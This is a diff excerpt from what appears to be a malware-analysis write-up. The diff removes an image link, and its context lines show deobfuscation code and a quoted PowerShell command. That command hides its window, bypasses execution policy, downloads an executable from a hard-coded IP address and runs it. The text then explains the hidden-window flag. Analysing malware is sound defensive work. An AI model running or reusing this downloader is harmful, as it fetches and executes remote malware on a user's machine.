@@ -135,7 +135,6 @@ Sqtnew = Replace(Sqtnew, "*", "")
 Sqtnew = Replace(Sqtnew, "^", "")`
 
 
-![[Pasted image 20250415093239.png]]
 ``"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"``
 
 So, in PowerShell, running the -WindowStyle parameter allows you to control how the PowerShell window appears when executing a script or command. In this case, hidden means that the PowerShell window won’t be visible to the user.
